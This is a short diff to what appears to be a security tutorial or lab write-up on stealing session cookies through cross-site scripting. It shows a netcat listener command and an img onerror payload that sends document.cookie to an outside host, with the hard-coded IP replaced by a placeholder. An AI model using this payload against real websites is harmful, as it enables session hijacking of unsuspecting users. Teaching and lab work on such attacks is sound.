@@ -39,5 +39,5 @@ nc -lvp 5001
 Then use the following script to export the cookie to your local machine. Note the `removeAttribute` is used to prevent the script from running more than once.
 
 ```
-<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+<img src=x onerror="this.src='http://<IP ADDRESS>:5001/?'+document.cookie; this.removeAttribute('onerror');">
 ```
